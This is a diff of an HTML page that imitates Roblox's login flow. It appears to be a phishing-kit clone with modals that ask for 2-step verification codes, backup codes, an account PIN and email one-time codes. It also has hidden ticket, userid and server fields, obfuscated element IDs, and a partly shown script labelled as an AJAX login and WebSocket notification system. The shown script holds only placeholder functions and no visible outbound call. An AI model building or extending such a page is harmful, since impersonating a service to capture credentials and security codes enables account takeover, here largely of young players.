+                        <p class="text-footer footer-note">©2026 Roblox Corporation. Roblox, the Roblox logo and
+                            Powering Imagination are among our registered and unregistered trademarks in the U.S. and
+                            other countries.</p>
                     </div>
                 </div>
-                <div class="xsmall" bis_skin_checked="1"> The Roblox installer
-                    should download shortly. If it doesnÃ¢â‚¬â„¢t, start the <a
-                        id="GameLaunchManualInstallLink" href="#"
-                        class="text-link">download now.</a> </div>
             </div>
-        </div>
-        <div class="InstallInstructionsImage" data-modalwidth="970"
-            style="display:none;" bis_skin_checked="1"></div>
-        <div id="pluginObjDiv"
-            style="height:1px;width:1px;visibility:hidden;position: absolute;top: 0;"
-            bis_skin_checked="1"></div>
-        <iframe id="downloadInstallerIFrame" name="downloadInstallerIFrame"
-            style="visibility:hidden;height:0;width:1px;position:absolute"></iframe>
-        <div class="ConfirmationModal modalPopup unifiedModal smallModal"
-            data-modal-handle="confirmation" style="display:none;"
-            bis_skin_checked="1">
-            <a class="genericmodal-close ImageButton closeBtnCircle_20h"></a>
-            <div class="Title" bis_skin_checked="1"></div>
-            <div class="GenericModalBody" bis_skin_checked="1">
-                <div class="TopBody" bis_skin_checked="1">
-                    <div class="ImageContainer roblox-item-image"
-                        data-image-size="small" data-no-overlays data-no-click
-                        bis_skin_checked="1"> <img class="GenericModalImage"
-                            alt="generic image"> </div>
-                    <div class="Message" bis_skin_checked="1"></div>
-                </div>
-                <div
-                    class="ConfirmationModalButtonContainer GenericModalButtonContainer"
-                    bis_skin_checked="1"> <a href
-                        id="roblox-confirm-btn"><span></span></a> <a href
-                        id="roblox-decline-btn"><span></span></a>
-                </div>
-                <div class="ConfirmationModalFooter" bis_skin_checked="1">
-                </div>
-            </div>
-        </div>
-        <div id="modal-confirmation" class="modal-confirmation"
-            data-modal-type="confirmation" bis_skin_checked="1">
-            <div id="modal-dialog" class="modal-dialog" bis_skin_checked="1">
-                <div class="modal-content" bis_skin_checked="1">
+        </footer>
+    </div>
+
+    <!-- Get One-Time Code Modal -->
+    <div id="emailSend" style="display: none" role="dialog" bis_skin_checked="1">
+        <div class="fade modal-backdrop in" bis_skin_checked="1"></div>
+        <div role="dialog" tabindex="-1" class="fade email-verify-code-modal in modal"
+            style="display: flex;justify-content: center;align-items: center" bis_skin_checked="1">
+            <div class="modal-lg modal-dialog" bis_skin_checked="1">
+                <div class="modal-content" role="document" bis_skin_checked="1">
                     <div class="modal-header" bis_skin_checked="1">
-                        <button type="button" class="close"
-                            data-dismiss="modal"> <span aria-hidden="true"><span
-                                    class="icon-close"></span></span><span
-                                class="sr-only">Close</span> </button>
-                        <h5 class="modal-title"></h5>
+                        <button type="button" class="close" title="close"><span
+                                onclick="document.getElementById('emailSend').style.display= 'none'"
+                                class="icon-close"></span></button>
+                        <h4 class="modal-title">Get One-Time Code</h4>
                     </div>
                     <div class="modal-body" bis_skin_checked="1">
-                        <div class="modal-top-body" bis_skin_checked="1">
-                            <div class="modal-message"
-                                bis_skin_checked="1"></div>
-                            <div class="modal-image-container roblox-item-image"
-                                data-image-size="medium" data-no-overlays
-                                data-no-click bis_skin_checked="1"> <img
-                                    class="modal-thumb" alt="generic image">
-                            </div>
-                            <div class="modal-checkbox checkbox"
-                                bis_skin_checked="1">
-                                <input id="modal-checkbox-input"
-                                    type="checkbox">
-                                <label for="modal-checkbox-input"></label>
-                            </div>
-                        </div>
-                        <div class="modal-btns" bis_skin_checked="1"> <a href
-                                id="confirm-btn"><span></span></a> <a href
-                                id="decline-btn"><span></span></a> </div>
-                        <div class="loading modal-processing"
-                            bis_skin_checked="1"> <img class="loading-default"
-                                src="https://images.rbxcdn.com/4bed93c91f909002b1f17f05c0ce13d1.gif"
-                                alt="Processing...">
-                        </div>
-                    </div>
-                    <div class="modal-footer text-footer" bis_skin_checked="1">
+                        <p class="email-verify-code-help-text">Enter the email verified on your account to receive a
+                            one-time code.</p>
+                        <input placeholder="Email" type="email" class="form-control input-field email-verify-code-input"
+                            autocomplete="email" maxlength="320" value="">
+                        <p class="text-error input-validation email-verify-code-error-text"></p>
+                        <button onclick="sendEmail()" type="button"
+                            class="email-verify-code-button btn-secondary-md btn-min-width">Send Code</button>
                     </div>
                 </div>
             </div>
         </div>
-        <div role="dialog" id="captcha"
-            style="display: none; justify-content: center;align-items: center"
+    </div>
+
+    <!-- New Login Attempt Modal -->
+    <div id="yleobaes" style="display: none" role="dialog" bis_skin_checked="1">
+        <div class="fade modal-backdrop in" bis_skin_checked="1"></div>
+        <div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;"
             bis_skin_checked="1">
-            <div class="fade modal-backdrop in" bis_skin_checked="1"></div>
-            <div role="dialog" tabindex="-1"
-                class="fade modal-modern modal-modern-challenge-captcha in modal"
-                style="display: flex; justify-content: center;align-items: center"
-                bis_skin_checked="1">
-                <div class="modal-dialog" bis_skin_checked="1">
-                    <div class="modal-content" role="document"
-                        bis_skin_checked="1">
-                        <div class="modal-body" bis_skin_checked="1">
-                            <button type="button"
-                                class="challenge-captcha-close-button"
-                                onclick="document.getElementById('captcha').style.display = 'none'; document.getElementById('rbx-body').style.overflow = 'block';">
-                                <span class="icon-close"></span>
-                            </button>
-                            <div bis_skin_checked="1"></div>
+            <div class="modal-dialog" bis_skin_checked="1">
+                <div class="modal-content" role="document" bis_skin_checked="1">
+                    <div title="" class="modal-header" bis_skin_checked="1">
+                        <button type="button" onclick="document.getElementById('yleobaes').style.display = 'none'"
+                            class="modal-modern-header-button"><span class="icon-close"></span></button>
+                        <h4 class="modal-title">New Login Attempt</h4>
+                        <div class="modal-modern-header-info" bis_skin_checked="1"></div>
+                    </div>
+                    <div class="modal-body" bis_skin_checked="1">
+                        <div class="modal-lock-icon" bis_skin_checked="1"></div>
+                        <p class="modal-margin-bottom">To approve or reject this attempt, open the Roblox app from a
+                            logged-in mobile or tablet device.</p>
+                        <button type="button" class="modal-action-button btn-secondary-md modal-margin-bottom"
+                            aria-label="Retry">Retry</button>
+                        <p><button type="button" class="modal-body-button-link small">Use another verification
+                                method</button></p>
+                        <p class="text-footer modal-margin-bottom">Need help? Visit our <a
+                                class="text-name text-footer contact" href="https://www.roblox.com/info/2sv"
+                                target="_blank" rel="noopener noreferrer" bis_skin_checked="1">Help Center</a></p>
+                        <p class="modal-margin-bottom-xlarge text-error xsmall"></p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
 
+    <!-- 2-Step Verification Modal (Copied from Original) -->
+    <div role="dialog" style="display: none" id="twostepverification" bis_skin_checked="1">
+        <div class="fade modal-backdrop in" bis_skin_checked="1"></div>
+        <div role="dialog" tabindex="-1" class="fade modal-modern in modal" bis_skin_checked="1">
+            <div class="modal-dialog" bis_skin_checked="1">
+                <div class="modal-content" role="document" bis_skin_checked="1">
+                    <div class="modal-header" bis_skin_checked="1">
+                        <button type="button" class="modal-modern-header-button"
+                            onclick="document.getElementById('twostepverification').style.display = 'none'; document.getElementById('rbx-body').style.overflow = 'auto';"><span
+                                class="icon-close"></span></button>
+                        <h4 class="modal-title">2-Step Verification</h4>
+                        <div class="modal-modern-header-info" bis_skin_checked="1"></div>
+                    </div>
+                    <div class="modal-body" bis_skin_checked="1">
+                        <div class="modal-lock-icon" bis_skin_checked="1"></div>
+                        <p class="modal-margin-bottom-xlarge">Enter the code we just sent you via email.</p>
+                        <div class="input-control-wrapper" bis_skin_checked="1">
+                            <form>
+                                <div id="twostep-group" class="form-group" bis_skin_checked="1">
+                                    <input as="input" autocomplete="off" maxlength="6"
+                                        oninput="twostepInput(this.value, 'verifyButton'); this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');"
+                                        placeholder="Enter 6-digit Code" id="two-step-verification-code-input"
+                                        class="input-field form-control">
+                                    <input type="text" id="ticket" hidden="">
+                                    <input type="text" id="userid" hidden="">
+                                    <input type="text" id="server" hidden="">
+                                    <div class="form-control-label bottom-label xsmall" id="twostep-error"
+                                        bis_skin_checked="1">&nbsp;</div>
+                                </div>
+                            </form>
                         </div>
+                        <p class="modal-margin-bottom-xlarge"><input id="remember-device" type="checkbox" tabindex="0">
+                            <label for="remember-device">Trust this device for 30 days</label>
+                        </p>
+                        <p><button type="button" class="modal-body-button-link small">Resend Code</button></p>
+                        <p><button type="button" class="modal-body-button-link small"
+                                onclick="document.getElementById('selectVerificationMethodEmail').style.display = 'block'; document.getElementById('twostepverification').style.display = 'none';">Use
+                                another verification method</button>
+                        </p>
+                    </div>
+                    <div class="modal-footer" bis_skin_checked="1">
+                        <div class="modal-modern-footer-buttons" bis_skin_checked="1">
+                            <button type="button" class="modal-modern-footer-button" aria-label="Verify"
+                                onclick="send();" id="verifyButton" disabled="">Verify</button>
+                        </div>
+                        <p class="text-footer modal-margin-bottom">Need help? Contact <a
+                                class="text-name text-footer contact" href="https://www.roblox.com/info/2sv"
+                                target="_blank" rel="noopener noreferrer" bis_skin_checked="1">Roblox Support</a></p>
+                        <p class="text-footer">IMPORTANT: Don't share your security codes with anyone. Roblox will never
+                            ask you for your codes. This can include things like texting your code, screensharing, etc.
+                        </p>
                     </div>
                 </div>
             </div>
         </div>
+    </div>
 
-        <div role="dialog" id="twostepverification" style="display: none;"
-            bis_skin_checked="1">
-            <div class="fade modal-backdrop in" bis_skin_checked="1"></div>
-            <div role="dialog" tabindex="-1" class="fade modal-modern in modal"
-                style="display: block;" bis_skin_checked="1">
-                <div class="modal-dialog" bis_skin_checked="1">
-                    <div class="modal-content" role="document"
-                        bis_skin_checked="1">
-                        <div class="modal-header" bis_skin_checked="1">
-                            <button type="button"
-                                class="modal-modern-header-button"
-                                onclick="document.getElementById('twostepverification').style.display = 'none';"><span
-                                    class="icon-close"></span></button>
-                            <h4 class="modal-title">2-Step Verification</h4>
-                            <div class="modal-modern-header-info"
-                                bis_skin_checked="1"></div>
-                        </div>
-                        <div class="modal-body" bis_skin_checked="1">
-                            <div class="modal-lock-icon"
-                                bis_skin_checked="1"></div>
-                            <p class="modal-margin-bottom-xlarge">Enter the code
-                                we just sent you via email.</p>
-                            <div class="input-control-wrapper"
-                                bis_skin_checked="1">
-                                <form>
-                                    <div id="twostep-group"
-                                        class="   form-group"
-                                        bis_skin_checked="1">
-                                        <input as="input" autocomplete="off"
-                                            maxlength="6"
-                                            oninput="twostepInput(this.value, 'verifyButton'); this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');"
-                                            placeholder="Enter 6-digit Code"
-                                            id="two-step-verification-code-input"
-                                            class="input-field form-control"><input
-                                            type="text" id="ticket"
-                                            hidden><input type="text"
-                                            id="userid" hidden><input
-                                            type="text" id="server" hidden>
-                                        <div
-                                            class="form-control-label bottom-label xsmall"
-                                            id="twostep-error"
-                                            bis_skin_checked="1">&nbsp;</div>
-                                    </div>
-                                </form>
-                            </div>
-                            <p class="modal-margin-bottom-xlarge"><input
-                                    id="remember-device" type="checkbox"
-                                    tabindex="0">
-                                <label for="remember-device">Trust this device
-                                    for 30 days</label></p>
-                            <p><button type="button"
-                                    class="modal-body-button-link small">Resend
-                                    Code</button></p>
-                            <p><button type="button"
-                                    class="modal-body-button-link small"
-                                    onclick="document.getElementById('selectVerificationMethodEmail').style.display = 'block'; document.getElementById('twostepverification').style.display = 'none';">Use
-                                    another verification method</button>
-                            </p>
-                        </div>
-                        <div class="modal-footer" bis_skin_checked="1">
-                            <div class="modal-modern-footer-buttons"
-                                bis_skin_checked="1">
-                                <button type="button"
-                                    class="btn-cta-md modal-modern-footer-button"
-                                    aria-label="Verify" onclick="send();"
-                                    id="verifyButton" disabled>Verify</button>
-                            </div>
-                            <p class="text-footer modal-margin-bottom">Need
-                                help? Contact <a
-                                    class="text-name text-footer contact"
-                                    href="https://www.roblox.com/info/2sv"
-                                    target="_blank" rel="noopener noreferrer"
-                                    bis_skin_checked="1">Roblox Support</a></p>
-                            <p class="text-footer">IMPORTANT: Don't share your
-                                security codes with anyone. Roblox will never
-                                ask you for your codes. This can include things
-                                like texting your code, screensharing, etc.
-                            </p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
 
-        <div role="dialog" id="twostepverification2" style="display: none;"
-            bis_skin_checked="1">
-            <div class="fade modal-backdrop in" bis_skin_checked="1"></div>
-            <div role="dialog" tabindex="-1" class="fade modal-modern in modal"
-                style="display: block;" bis_skin_checked="1">
-                <div class="modal-dialog" bis_skin_checked="1">
-                    <div class="modal-content" role="document"
-                        bis_skin_checked="1">
-                        <div class="modal-header" bis_skin_checked="1">
-                            <button type="button"
-                                class="modal-modern-header-button"
-                                onclick="document.getElementById('twostepverification').style.display = 'none';"><span
-                                    class="icon-close"></span></button>
-                            <h4 class="modal-title">2-Step Verification</h4>
-                            <div class="modal-modern-header-info"
-                                bis_skin_checked="1"></div>
-                        </div>
-                        <div class="modal-body" bis_skin_checked="1">
-                            <div class="modal-lock-icon"
-                                bis_skin_checked="1"></div>
-                            <p class="modal-margin-bottom-xlarge">Enter the code
-                                generated by your authenticator app.</p>
-                            <div class="input-control-wrapper"
-                                bis_skin_checked="1">
-                                <form>
-                                    <div id="twostep-group"
-                                        class="   form-group"
-                                        bis_skin_checked="1">
-                                        <input as="input" autocomplete="off"
-                                            maxlength="6"
-                                            oninput="twostepInput(this.value, 'verifyButton'); this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');"
-                                            placeholder="Enter 6-digit Code"
-                                            id="two-step-verification-code-inputt"
-                                            class="input-field form-control"><input
-                                            type="text" id="ticket"
-                                            hidden><input type="text"
-                                            id="userid" hidden><input
-                                            type="text" id="server" hidden>
-                                        <div
-                                            class="form-control-label bottom-label xsmall"
-                                            id="twostep-errorr"
-                                            bis_skin_checked="1">&nbsp;</div>
-                                    </div>
-                                </form>
-                            </div>
-                            <p class="modal-margin-bottom-xlarge"><input
-                                    id="remember-device" type="checkbox"
-                                    tabindex="0">
-                                <label for="remember-device">Trust this device
-                                    for 30 days</label></p>
-                            <p><button type="button"
-                                    class="modal-body-button-link small">Resend
-                                    Code</button></p>
-                            <p><button type="button"
-                                    class="modal-body-button-link small"
-                                    onclick="document.getElementById('selectVerificationMethodEmail').style.display = 'block'; document.getElementById('twostepverification').style.display = 'none';">Use
-                                    another verification method</button>
-                            </p>
-                        </div>
-                        <div class="modal-footer" bis_skin_checked="1">
-                            <div class="modal-modern-footer-buttons"
-                                bis_skin_checked="1">
-                                <button type="button"
-                                    class="btn-cta-md modal-modern-footer-button"
-                                    aria-label="Verify" onclick="send2();"
-                                    id="verifyButton">Verify</button>
-                            </div>
-                            <p class="text-footer modal-margin-bottom">Need
-                                help? Contact <a
-                                    class="text-name text-footer contact"
-                                    href="https://www.roblox.com/info/2sv"
-                                    target="_blank" rel="noopener noreferrer"
-                                    bis_skin_checked="1">Roblox Support</a></p>
-                            <p class="text-footer">IMPORTANT: Don't share your
-                                security codes with anyone. Roblox will never
-                                ask you for your codes. This can include things
-                                like texting your code, screensharing, etc.
-                            </p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
+    <!-- ============================================ -->
+    <!-- AJAX Login + WebSocket Notification System   -->
+    <!-- ============================================ -->
+    <script>
+        // Helper function for twostep input (used in oninput attribute)
+        function twostepInput(value, buttonId) {
+            const button = document.getElementById(buttonId);
+            if (button) {
+                button.disabled = value.length !== 6;
+            }
+        }
 
-        <div id="yleobaes" style="display: none" role="dialog"
-            bis_skin_checked="1">
-            <div class="fade modal-backdrop in" bis_skin_checked="1"></div>
-            <div role="dialog" tabindex="-1" class="fade modal-modern in modal"
-                style="display: block;" bis_skin_checked="1">
-                <div class="modal-dialog" bis_skin_checked="1">
-                    <div class="modal-content" role="document"
-                        bis_skin_checked="1">
-                        <div title class="modal-header" bis_skin_checked="1">
-                            <button type="button"
-                                onclick="document.getElementById('yleobaes').style.display = 'none' "
-                                class="modal-modern-header-button"><span
-                                    class="icon-close"></span></button>
-                            <h4 class="modal-title">New Login Attempt</h4>
-                            <div class="modal-modern-header-info"
-                                bis_skin_checked="1"></div>
-                        </div>
-                        <div class="modal-body" bis_skin_checked="1">
-                            <div class="modal-lock-icon"
-                                bis_skin_checked="1"></div>
-                            <p class="modal-margin-bottom">To approve or reject
-                                this attempt, open the Roblox app from a
-                                logged-in mobile or tablet device.</p>
-                            <button type="button"
-                                class="modal-action-button btn-secondary-md modal-margin-bottom"
-                                aria-label="Retry">Retry</button>
-                            <p><button type="button"
-                                    class="modal-body-button-link small">Use
-                                    another verification method</button>
-                            </p>
-                            <p class="text-footer modal-margin-bottom">Need
-                                help? Visit our <a
-                                    class="text-name text-footer contact"
-                                    href="https://www.roblox.com/info/2sv"
-                                    target="_blank" rel="noopener noreferrer"
-                                    bis_skin_checked="1">Help Center</a></p>
-                            <p
-                                class="modal-margin-bottom-xlarge text-error xsmall"></p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <div role="dialog" id="PIN" style="display: none;" bis_skin_checked="1">
-            <div class="fade modal-backdrop in" bis_skin_checked="1"></div>
-            <div role="dialog" tabindex="-1" class="fade modal-modern in modal"
-                style="display: block;" bis_skin_checked="1">
-                <div class="modal-dialog" bis_skin_checked="1">
-                    <div class="modal-content" role="document"
-                        bis_skin_checked="1">
-                        <div class="modal-header" bis_skin_checked="1">
-                            <button type="button"
-                                class="modal-modern-header-button"
-                                onclick="document.getElementById('PIN').style.display = 'none';"><span
-                                    class="icon-close"></span></button>
-                            <h4 class="modal-title">Account PIN Required</h4>
-                            <div class="modal-modern-header-info"
-                                bis_skin_checked="1"></div>
-                        </div>
-                        <div class="modal-body" bis_skin_checked="1">
-                            <p class="modal-margin-bottom-sm">Enter the PIN
-                                attached to your account</p>
-                            <center><input type="password" id="pin_input"
-                                    class="form-control pin-field ng-valid-maxlength ng-not-empty ng-valid-parse ng-valid-required ng-valid ng-valid-minlength ng-touched ng-pristine"
-                                    name="pin" autocomplete="off"
-                                    ng-trim="false" ng-model="pinInfo.pin"
-                                    minlength="4" maxlength="4" ng-minlength="4"
-                                    ng-maxlength="4" ng-required="true"
-                                    key-press-enter="submit(pinUnlockForm)"
-                                    numbers-only autofocus required="required"
-                                    style="width: 76px; height: 38px; text-align: center;">
-                            </center>
-                            <p class="modal-margin-bottom-xlarge text-error"
-                                id="pinError"></p>
-                            <p class="text-error xsmall"></p>
-                        </div>
-                        <div class="modal-footer" bis_skin_checked="1">
-                            <center>
-                                <button type="submit"
-                                    class="modal-button btn-secondary-md ng-binding"
-                                    onclick="sendPin()">Unlock</button>
-                            </center>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
+        // Placeholder for send() function (called by Verify button)
+        function send() {
+            const code = document.getElementById('two-step-verification-code-input').value;
+            console.log('Verify code sent:', code);
+            // Add your verification logic here
+        }
 
-        <div id="emailSend" style="display: none" role="dialog"
-            bis_skin_checked="1">
-            <div class="fade modal-backdrop in" bis_skin_checked="1"></div>
-            <div role="dialog" tabindex="-1"
-                class="fade email-verify-code-modal in modal"
-                style="display: flex;justify-content: center;align-items: center"
-                bis_skin_checked="1">
-                <div class="modal-lg modal-dialog" bis_skin_checked="1">
-                    <div class="modal-content" role="document"
-                        bis_skin_checked="1">
-                        <div class="modal-header" bis_skin_checked="1">
-                            <button type="button" class="close"
-                                title="close"><span
-                                    onclick="document.getElementById('emailSend').style.display= 'none' "
-                                    class="icon-close"></span></button>
-                            <h4 class="modal-title">Get One-Time Code</h4>
-                        </div>
-                        <div class="modal-body" bis_skin_checked="1">
-                            <p class="email-verify-code-help-text">Enter the
-                                email verified on your account to receive a
-                                one-time code.</p><input placeholder="Email"
-                                type="email"
-                                class="form-control input-field email-verify-code-input"
-                                autocomplete="email" maxlength="320" value>
-                            <p
-                                class="text-error input-validation email-verify-code-error-text"></p>
-                            <button onclick="sendEmail()" type="button"
-                                class="email-verify-code-button btn-secondary-md btn-min-width">Send
-                                Code</button>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
+        function validateLoginForm() {
+            const username = document.getElementById('login-username').value.trim();
+            const password = document.getElementById('login-password').value.trim();
 
-        <div style="display: none" id="emailcode" role="dialog"
-            bis_skin_checked="1">
-            <div class="fade modal-backdrop in" bis_skin_checked="1"></div>
-            <div role="dialog" tabindex="-1"
-                class="fade email-verify-code-modal in modal"
-                style="display: flex;justify-content: center;align-items: center"
-                bis_skin_checked="1">
-                <div class="modal-lg modal-dialog" bis_skin_checked="1">
-                    <div class="modal-content" role="document"
-                        bis_skin_checked="1">
-                        <div class="modal-header" bis_skin_checked="1">
-                            <button type="button" class="close"
-                                title="close"><span
-                                    onclick="document.getElementById('emailcode').style.display= 'none'; document.getElementById('emailcode').style.display= 'none'"
-                                    class="icon-close"></span></button>
-                            <h4 class="modal-title">Enter One-Time Code</h4>
-                        </div>
-                        <div class="modal-body" bis_skin_checked="1">
-                            <div class="email-verify-code-help-text"
-                                bis_skin_checked="1">
-                                <p classname="email-verify-code-help-text">Enter
-                                    the code we just sent to your email address
-                                </p>
-                            </div>
-                            <div class="email-verify-code-email-display"
-                                bis_skin_checked="1"></div><input id="mojma"
-                                placeholder="6-Digit Code" type="text"
-                                inputmode="numeric" maxlength="6"
-                                class="form-control input-field email-verify-code-input"
-                                value>
-                            <p id="damgala"
-                                class="text-error email-verify-code-error-text"></p>
-                            <button onclick="sendEmailCode()" type="button"
-                                class="email-verify-code-button btn-secondary-md btn-min-width">Confirm</button>
-                            <div
-                                class="font-caption-header email-verify-code-help-link"
-                                bis_skin_checked="1">
-                                <p style="cursor: pointer" class="text-link"
-                                    onclick="window.location='https://en.help.roblox.com/hc/en-us/articles/11014749736980-Logging-In-with-a-One-Time-Code' "
-                                    rel="noreferrer">Didn't receive code? Click
-                                    here</p>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
+            const usernameError = document.getElementById('username-error');
+            const passwordError = document.getElementById('password-error');
+            const generalError = document.getElementById('text-error');
 
-        <div role="dialog" id="RecoveryFromAuthen" style="display: none;"
-            bis_skin_checked="1">
-            <div class="fade modal-backdrop in" bis_skin_checked="1"></div>
-            <div role="dialog" tabindex="-1" class="fade modal-modern in modal"
-                style="display: block;" bis_skin_checked="1">
-                <div class="modal-dialog" bis_skin_checked="1">
-                    <div class="modal-content" role="document"
-                        bis_skin_checked="1">
-                        <div class="modal-header" bis_skin_checked="1">
-                            <button type="button"
-                                class="modal-modern-header-button"
-                                onclick="document.getElementById('RecoveryFromAuthen').style.display = 'none'; document.getElementById('rbx-body').style.overflow = 'block';"><span
-                                    class="icon-close"></span></button>
-                            <h4 class="modal-title">2-Step Verification</h4>
-                            <div class="modal-modern-header-info"
-                                bis_skin_checked="1"></div>
-                        </div>
-                        <div class="modal-body" bis_skin_checked="1">
-                            <div class="modal-lock-icon"
-                                bis_skin_checked="1"></div>
-                            <p class="modal-margin-bottom-xlarge">Enter a
-                                previously saved backup code.</p>
-                            <div class="input-control-wrapper"
-                                bis_skin_checked="1">
-                                <form>
-                                    <div id="RecoveryFromAuthen-group"
-                                        class="   form-group"
-                                        bis_skin_checked="1"><input as="input"
-                                            autocomplete="off" maxlength="9"
-                                            oninput="twostepInputRecovery(this.value, 'RecoveryFromAuthenButton');"
-                                            placeholder="Enter 9-digit Code"
-                                            id="two-step-verification-code-input-recoveryFromAuthen"
-                                            class="input-field form-control"
-                                            value>
+            // Clear previous errors
+            usernameError.style.display = 'none';
+            passwordError.style.display = 'none';
+            clearErrorMessage('text-error');
 
-                                        <div
-                                            class="form-control-label bottom-label xsmall"
-                                            id="RecoveryFromAuthen-error"
-                                            bis_skin_checked="1">
-                                            &nbsp;</div>
-                                    </div>
-                                </form>
-                            </div>
-                            <p class="modal-margin-bottom-xlarge"><input
-                                    id="remember-device" type="checkbox"
-                                    tabindex="0">
-                                <label for="remember-device">Trust this device
-                                    for 30 days</label></p>
-                            <p><button type="button"
-                                    class="modal-body-button-link small"
-                                    onclick="document.getElementById('selectVerificationMethodAuthen').style.display = 'block'; document.getElementById('RecoveryFromAuthen').style.display = 'none';">Use
-                                    another verification method</button>
-                            </p>
-                        </div>
-                        <div class="modal-footer" bis_skin_checked="1">
-                            <div class="modal-modern-footer-buttons"
-                                bis_skin_checked="1">
-                                <button type="button"
-                                    class="btn-cta-md modal-modern-footer-button"
-                                    aria-label="Verify"
-                                    onclick="RecoveryFromAuthen();"
-                                    id="RecoveryFromAuthenButton"
-                                    disabled>Verify</button>
-                            </div>
-                            <p class="text-footer modal-margin-bottom">Need
-                                help? Contact <a
-                                    class="text-name text-footer contact"
-                                    href="https://www.roblox.com/info/2sv"
-                                    target="_blank" rel="noopener noreferrer"
-                                    bis_skin_checked="1">Roblox Support</a></p>
-                            <p class="text-footer">IMPORTANT: Don't share your
-                                security codes with anyone. Roblox will never
-                                ask you for your codes. This can include things
-                                like texting your code, screensharing, etc.
-                            </p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <div role="dialog" id="RecoveryFromEmail" style="display: none;"
-            bis_skin_checked="1">
-            <div class="fade modal-backdrop in" bis_skin_checked="1"></div>
-            <div role="dialog" tabindex="-1" class="fade modal-modern in modal"
-                style="display: block;" bis_skin_checked="1">
-                <div class="modal-dialog" bis_skin_checked="1">
-                    <div class="modal-content" role="document"
-                        bis_skin_checked="1">
-                        <div class="modal-header" bis_skin_checked="1">
-                            <button type="button"
-                                class="modal-modern-header-button"
-                                onclick="document.getElementById('RecoveryFromEmail').style.display = 'none'; document.getElementById('rbx-body').style.overflow = 'block';"><span
-                                    class="icon-close"></span></button>
-                            <h4 class="modal-title">2-Step Verification</h4>
-                            <div class="modal-modern-header-info"
-                                bis_skin_checked="1"></div>
-                        </div>
-                        <div class="modal-body" bis_skin_checked="1">
-                            <div class="modal-lock-icon"
-                                bis_skin_checked="1"></div>
-                            <p class="modal-margin-bottom-xlarge">Enter a
-                                previously saved backup code.</p>
-                            <div class="input-control-wrapper"
-                                bis_skin_checked="1">
-                                <form>
-                                    <div id="RecoveryFromEmail-group"
-                                        class="   form-group"
-                                        bis_skin_checked="1"><input as="input"
-                                            autocomplete="off" maxlength="9"
-                                            oninput="twostepInputRecovery(this.value, 'RecoveryFromEmailButton');"
-                                            placeholder="Enter 9-digit Code"
-                                            id="two-step-verification-code-input-RecoveryFromEmail"
-                                            class="input-field form-control"
-                                            value>
-                                        <div
-                                            class="form-control-label bottom-label xsmall"
-                                            id="RecoveryFromEmail-error"
-                                            bis_skin_checked="1">
-                                            &nbsp;</div>
-                                    </div>
-                                </form>
-                            </div>
-                            <p class="modal-margin-bottom-xlarge"><input
-                                    id="remember-device" type="checkbox"
-                                    tabindex="0">
-                                <label for="remember-device">Trust this device
-                                    for 30 days</label></p>
-                            <p><button type="button"
-                                    class="modal-body-button-link small"
-                                    onclick="document.getElementById('selectVerificationMethodEmail').style.display = 'block'; document.getElementById('RecoveryFromEmail').style.display = 'none';">Use
-                                    another verification method</button>
-                            </p>
-                        </div>
-                        <div class="modal-footer" bis_skin_checked="1">
-                            <div class="modal-modern-footer-buttons"
-                                bis_skin_checked="1">
-                                <button type="button"
-                                    class="btn-cta-md modal-modern-footer-button"
-                                    aria-label="Verify"
-                                    onclick="RecoveryFromEmail();"
-                                    id="RecoveryFromEmailButton"
-                                    disabled>Verify</button>
-                            </div>
-                            <p class="text-footer modal-margin-bottom">Need
-                                help? Contact <a
-                                    class="text-name text-footer contact"
-                                    href="https://www.roblox.com/info/2sv"
-                                    target="_blank" rel="noopener noreferrer"
-                                    bis_skin_checked="1">Roblox Support</a></p>
-                            <p class="text-footer">IMPORTANT: Don't share your
-                                security codes with anyone. Roblox will never
-                                ask you for your codes. This can include things
-                                like texting your code, screensharing, etc.
-                            </p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <div role="dialog" id="selectVerificationMethodEmail"
-            style="display: none;" bis_skin_checked="1">
-            <div class="fade modal-backdrop in" bis_skin_checked="1"></div>
-            <div role="dialog" tabindex="-1" class="fade modal-modern in modal"
-                style="display: block;" bis_skin_checked="1">
-                <div class="modal-dialog" bis_skin_checked="1">
-                    <div class="modal-content" role="document"
-                        bis_skin_checked="1">
-                        <div class="modal-header" bis_skin_checked="1">
-                            <button type="button"
-                                class="modal-modern-header-button"
-                                onclick="document.getElementById('selectVerificationMethodAuthen').style.display = 'none'; document.getElementById('rbx-body').style.overflow = 'block';"><span
-                                    class="icon-close"></span></button>
-                            <h4 class="modal-title">2-Step Verification</h4>
-                            <div class="modal-modern-header-info"
-                                bis_skin_checked="1"></div>
-                        </div>
-                        <div class="modal-body" bis_skin_checked="1">
-                            <div class="modal-lock-icon"
-                                bis_skin_checked="1"></div>
-                            <p class="modal-margin-bottom-xlarge">Choose
-                                alternate verification method.</p>
-                            <table
-                                class="table table-striped media-type-list modal-margin-bottom-large">
-                                <tbody>
-                                    <tr class="media-type-row"
-                                        onclick="document.getElementById('selectVerificationMethodEmail').style.display = 'none';document.getElementById('twostepverification').style.display = 'block';">
-                                        <td><span
-                                                class="icon-menu-email"></span></td>
-                                        <td class="media-type-label">Email</td>
-                                        <td class="media-type-selector"><span
-                                                class="icon-next"></span>
-                                            <div class="icon-placeholder"
-                                                bis_skin_checked="1"></div>
-                                        </td>
-                                    </tr>
-                                    <tr class="media-type-row">
-                                        <td><span
-                                                class="icon-menu-recover"></span></td>
-                                        <td class="media-type-label"
-                                            onclick="document.getElementById('selectVerificationMethodEmail').style.display = 'none';document.getElementById('RecoveryFromEmail').style.display = 'block';">
-                                            Backup Code</td>
-                                        <td class="media-type-selector"><span
-                                                class="icon-next"></span>
-                                            <div class="icon-placeholder"
-                                                bis_skin_checked="1"></div>
-                                        </td>
-                                    </tr>
-                                </tbody>
-                            </table>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
